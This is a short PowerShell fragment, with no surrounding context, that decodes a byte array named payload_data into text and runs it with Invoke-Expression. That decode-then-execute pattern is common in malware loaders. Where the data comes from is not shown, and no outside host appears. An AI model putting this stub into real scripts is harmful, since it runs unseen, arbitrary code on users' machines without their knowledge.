$payload_string = [System.Text.Encoding]::ASCII.GetString($payload_data)
Invoke-Expression "$payload_string"
